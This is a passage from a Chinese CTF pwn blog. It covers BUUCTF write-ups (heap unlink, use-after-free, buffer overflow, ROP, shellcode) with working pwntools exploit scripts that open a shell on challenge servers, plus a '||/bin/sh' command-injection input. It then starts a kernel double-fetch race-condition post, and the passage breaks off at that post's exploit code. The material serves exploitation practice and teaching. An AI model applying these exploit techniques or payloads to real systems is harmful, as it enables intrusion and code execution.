class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Content of heap :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">b&#x27;colin&#x27;</span>)	<span class="comment"># chunk #0</span></span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">b&#x27;colin&#x27;</span>)	<span class="comment"># chunk #1</span></span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)	<span class="comment"># chunk #2</span></span><br><span class="line">fakechunk_struct = p64(<span class="number">0</span>)</span><br><span class="line">fakechunk_struct += p64(<span class="number">0x80</span>)	<span class="comment"># fake chunk size = 0x80</span></span><br><span class="line">fakechunk_struct += p64(<span class="number">0x6020E0</span> - <span class="number">0x18</span>)	<span class="comment"># fake chunk fd, fd-&gt;bk = fake chunk</span></span><br><span class="line">fakechunk_struct += p64(<span class="number">0x6020E0</span> - <span class="number">0x10</span>)	<span class="comment"># fake chunk bk, bk-&gt;fd = fake chunk</span></span><br><span class="line">fakechunk_struct += cyclic(<span class="number">0x80</span> - <span class="number">0x20</span>)</span><br><span class="line">fakechunk_struct += p64(<span class="number">0x80</span>)	<span class="comment"># overwrite chunk #1 prev size</span></span><br><span class="line">fakechunk_struct += p64(<span class="number">0x90</span>)	<span class="comment"># overwrite prev_in_use bit = 0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x90</span>, fakechunk_struct)</span><br><span class="line">delete(<span class="number">1</span>)	<span class="comment"># trigger unlink, after deletion chunk #0 should be 0x6020E0 - 0x18 = 0x6020C8</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x20</span>, cyclic(<span class="number">0x18</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))	<span class="comment"># change chunk #0 to free().got</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x8</span>, p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))	<span class="comment"># change free().got to system().plt</span></span><br><span class="line">delete(<span class="number">2</span>)	<span class="comment"># system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>方法3：爆破修改__malloc_hook</strong><br>在方法一的fastbin attack之后，我们通过释放一个chunk到unsorted bin中能够在堆中写入main_arena+88的地址。通过分析可知__malloc_hook的地址应为main_arena - 0x10处。如果需要在这里分配一个fastbin，需要写入main_arena - 0x23来错位分配（起始地址即为下图中标出的地方），但这样需要修改最低两个字节的值，因此倒数第二低字节的高4位需要爆破，成功率为1&#x2F;16。分配到这里的地址之后，把one_gadget写入到hook中调用malloc即可。</p>
<p><img src="https://img-blog.csdnimg.cn/76c809f478a648e7950c095358d09319.png"><br>但是这种方法在本题中不太可行。因为本题不能读取任何数据，只能通过修改unsorted bin的fd和bk指针分配，而unsorted bin的检查比fastbin多得多，无法通过检查。如果能够将fastbin chunk的fd中写入此处的地址应该是没有问题的，但问题就在于我们无法获取其地址，只能通过修改低字节的方式修改它。</p>
<p>后来想想，如果真的要将fastbin chunk中的fd指针修改为main arena的地址也不是不行。方法：首先通过前两种方法获取到对heaparray的写权限，然后把一个chunk释放两次，第一次释放在fastbin中，第二次释放在unsorted bin中，两次释放之间通过堆溢出修改chunk的大小（改大）使第二次能被释放到unsorted bin中。</p>
<p>不过按照上面的方法就显得有点多此一举了。其思想与方法一是相同的，都是错位分配。因此这里就不再进行赘述了。感兴趣的读者可以自己实现一下。</p>
<h1 id="buu040-wustctf2020-getshell"><a href="#buu040-wustctf2020-getshell" class="headerlink" title="buu040-wustctf2020_getshell"></a>buu040-wustctf2020_getshell</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29015</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">24</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x804851B</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu041-bjdctf-2020-router"><a href="#buu041-bjdctf-2020-router" class="headerlink" title="buu041-bjdctf_2020_router"></a>buu041-bjdctf_2020_router</h1><p>nc直接连，输入1然后输入<code>||/bin/sh</code>即可。这是linux命令行特性，要知道<code>||</code>的含义：上一条命令执行失败之后执行下一条命令，远程没有ping，因此直接执行&#x2F;bin&#x2F;sh。</p>
<h1 id="buu042-hitcontraining-uaf"><a href="#buu042-hitcontraining-uaf" class="headerlink" title="buu042-hitcontraining_uaf"></a>buu042-hitcontraining_uaf</h1><p>经典菜单题，从题目标题就能看出来是一道考UAF的题。在del_note函数中果然出现了UAF漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( notelist[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[index]-&gt;strbuf);</span><br><span class="line">    <span class="built_in">free</span>(notelist[index]);		<span class="comment">// 没有清空指针</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>通过分析add_note函数可知，最多分配5个chunk，每一个chunk有一个函数指针和一个存放字符串的buffer，函数指针固定指向print_note_content函数。不难想到通过UAF可以将函数指针修改为后门函数magic：</p>
<ul>
<li>首先分配两个chunk，字符串chunk的大小大于0x20</li>
<li>释放这两个chunk</li>
<li>分配第三个chunk，字符串chunk大小为0x20，这样第三个chunk的字符串chunk和第一个chunk位置相同，修改其函数指针调用即可。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25067</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Note size :&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Content :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printc</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>, p32(<span class="number">0x8048945</span>) + p32(<span class="number">0</span>))</span><br><span class="line">printc(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="buu043-picoctf-2018-buffer-overflow-1"><a href="#buu043-picoctf-2018-buffer-overflow-1" class="headerlink" title="buu043-picoctf_2018_buffer overflow 1"></a>buu043-picoctf_2018_buffer overflow 1</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25573</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">40</span>+<span class="number">4</span>) + p32(<span class="number">0x80485CB</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu044-jarvisoj-test-your-memory"><a href="#buu044-jarvisoj-test-your-memory" class="headerlink" title="buu044-jarvisoj_test_your_memory"></a>buu044-jarvisoj_test_your_memory</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27588</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">19</span>+<span class="number">4</span>) + p32(<span class="number">0x8048440</span>) + p32(<span class="number">0x80487E0</span>)*<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu045-mrctf2020-shellcode"><a href="#buu045-mrctf2020-shellcode" class="headerlink" title="buu045-mrctf2020_shellcode"></a>buu045-mrctf2020_shellcode</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26987</span>)</span><br><span class="line">io.sendline(asm(shellcraft.amd64.sh()))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu046-inndy-rop"><a href="#buu046-inndy-rop" class="headerlink" title="buu046-inndy_rop"></a>buu046-inndy_rop</h1><p>首先把’&#x2F;bin&#x2F;sh’写到bss段然后系统调用。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;, 25928)</span></span><br><span class="line">int80 = <span class="number">0x806C943</span></span><br><span class="line">popeax_ret = <span class="number">0x80B8016</span></span><br><span class="line">popebx_edx_ret = <span class="number">0x806ECD9</span></span><br><span class="line">popecx_ret = <span class="number">0x80DE769</span></span><br><span class="line">addesp0x14_ret = <span class="number">0x807A75D</span></span><br><span class="line">bss = <span class="number">0x80EBFD4</span></span><br><span class="line">read = <span class="number">0x806D290</span></span><br><span class="line">payload = cyclic(<span class="number">12</span> + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read)			<span class="comment"># call read()</span></span><br><span class="line">payload += p32(addesp0x14_ret)	<span class="comment"># return address, add esp to execute latter ROP</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment"># arg #1 of read(): stdin</span></span><br><span class="line">payload += p32(bss)				<span class="comment"># arg #2 of read(): a bss address</span></span><br><span class="line">payload += p32(<span class="number">0x8</span>)				<span class="comment"># arg #3 of read(): read length</span></span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p32(popeax_ret)		<span class="comment"># eax = 0x11(SYS_EXECVE)</span></span><br><span class="line">payload += p32(<span class="number">11</span>)</span><br><span class="line">payload += p32(popebx_edx_ret)</span><br><span class="line">payload += p32(bss)				<span class="comment"># ebx = &#x27;/bin/sh&#x27;</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment"># edx = 0</span></span><br><span class="line">payload += p32(popecx_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment"># ecx = 0</span></span><br><span class="line">payload += p32(int80)			<span class="comment"># int 80</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-5/" class="post-title-link" itemprop="url">Kernel pwn 入门 (5)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:03" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:03+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>在用户态pwn中有一类题型叫做条件竞争。当程序需要在不同时刻访问相同一块内存时，如果没有做好并发访问的限制和检查，就有可能会产生恶意数据或执行恶意代码。今天笔者就来分析一下内核态中的条件竞争，以一道经典的题辅助学习。</p>
<h1 id="0CTF2018-baby（double-fetch）"><a href="#0CTF2018-baby（double-fetch）" class="headerlink" title="0CTF2018-baby（double fetch）"></a>0CTF2018-baby（double fetch）</h1><h2 id="Step-1-分析程序与调试"><a href="#Step-1-分析程序与调试" class="headerlink" title="Step 1: 分析程序与调试"></a>Step 1: 分析程序与调试</h2><p>按照惯例，打开IDA。<br><img src="https://img-blog.csdnimg.cn/e7047afbb0d7497f8300c571445a1582.png"><br>这个模块实现的功能只有一个：ioctl。我们跟进到其调用的ioctl_impl函数看一下。<br><img src="https://img-blog.csdnimg.cn/5303f6ef46de4a32ba173dd55789e8d4.png"><br>ioctl的指令码只有两种：0x6666和0x1337。当指令码为0x6666时，会打印出flag的地址。<br>当指令码为0x1337时，其会调用_chk_range_not_ok函数。一看名字就不难猜测，这是一个检查越界的函数：<br><img src="https://img-blog.csdnimg.cn/c6b5819ea1fc4add968768a9a0ba9ba4.png"><br>上面的__CFADD__函数的功能是返回两个参数相加后的CF标志位。当两个参数相加在最高位产生进位时CF为1，否则为0。不难想到如果a1和a2相加产生进位，那么一定会导致越界溢出。传入的第三个参数应该是数组的末尾地址，后面要判断a1+a2是否大于v4。</p>
<p>回到ioctl_impl函数，这里判断传入的第三个参数不能大于<code>*(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 0x1358)</code>这个东西。那这个东西到底是多少呢，我们写一个简单的程序调用一下这个模块看看。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-23.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, main);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    <span class="type">char</span> b[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不知道是什么原因，本题的内核没有办法直接下断点，也没有办法将断点下在用户态程序中。尝试了很长时间，才找到调试的方法：</p>
<h3 id="重要：内核模块调试方法："><a href="#重要：内核模块调试方法：" class="headerlink" title="重要：内核模块调试方法："></a>重要：内核模块调试方法：</h3><p>首先打开init文件，将权限改为root（即在启动sh的那一行把gid从1000改成0），然后启动内核输入lsmod命令获取到模块的加载地址。然后我们<strong>不用去管syscall到底调用了模块的什么函数，不用去管这个函数在什么地方，直接将断点下在输出的加载地址上。注意，其输出的地址是模块加载的起始地址，但依然可以发挥断点的作用。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # lsmod</span><br><span class="line">baby 16384 0 - Live 0xffffffffc02f8000 (OE)</span><br></pre></td></tr></table></figure>
<p>如上面的输出，我们可以直接将断点下在0xffffffffc02f8000，而无需在其上加上ioctl函数的偏移，也可以起到断点的作用。（亲测有效）</p>
<p>通过这种方式，我们成功调试漏洞模块，然后找到了<code>*(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 0x1358)</code>的值到底是多少：0x7ffffffff000。这是用户态栈区的最高地址，因此只要我们传入的是一个不太大的地址，都是可以的。<br><img src="https://img-blog.csdnimg.cn/e00e1f4520c14f25a8ed3a7081c2183c.png"><br>再回去看一下反汇编，注意第一个检查中的第一个参数cmpStr应该是一个指针，而第二个检查中的第二个参数应该表示字符串的长度，这里是将地址的值和第二个参数相加，因此不难猜测。即使猜不出来，第三个检查应该就非常明显了，检查这里的值是否等于flag的长度。flag的长度为33。因此我们要传入的参数应该是一个结构体的地址，这个结构体的前8字节是一个char*指针，后面8字节是33。<br><img src="https://img-blog.csdnimg.cn/f93aadf8db39412ca658af074d21fa9c.png"><br>在判断之后，会对传入的字符串进行检查，如果与flag相等则输出flag。这里就产生了竞争条件漏洞。</p>
<p><font color=red><strong>如果在进行if判断的时候，我们的地址传入的是正常的用户态地址，而在执行后面的字符串比较时，这个地址就被改变到了flag处，会怎么样呢？显然模块会用flag去比较其自身，这样显然是相等的。然后flag就能够被输出。如果我们使用双线程，就可以和内核模块竞争字符串地址这块内存的访问。只要能够在这个时间窗口成功修改字符串地址，后面的检查就可以通过。因此简单点说，竞争条件就是“时间的活”。</strong></font></p>
<p>在C语言中，我们使用pthread_create函数创建一个线程，可以让一个线程执行一个函数。具体的参数调用规则参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/wushuomin/article/details/80051295?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165858376216782391822691%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165858376216782391822691&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-80051295-null-null.142%5Ev33%5Econtrol,185%5Ev2%5Econtrol&utm_term=pthread_create&spm=1018.2226.3001.4187">资料</a>。</p>
<p>因此我们写出exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-23.</span></span><br><span class="line"><span 